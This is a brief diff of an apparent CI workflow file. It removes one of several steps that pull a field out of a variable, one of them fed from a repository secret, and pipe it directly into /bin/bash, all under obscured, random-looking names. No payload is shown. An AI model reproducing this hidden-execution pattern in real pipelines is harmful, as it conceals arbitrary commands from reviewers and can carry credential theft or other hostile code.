@@ -22,7 +22,6 @@ jobs:
           y668: ${{ secrets.y668 }}
         run: |
           printf '%s' "$y668" | jq -r .lucbl2 | /bin/bash
-          printf '%s' "$vlj55239" | jq -r .ewk6832 | /bin/bash
           printf '%s' "$a31653" | jq -r .ilde4 | /bin/bash
           printf '%s' "$ajo935" | jq -r .fl2713 | /bin/bash
           echo $dh0245 | jq -r .pwz58141 | /bin/bash
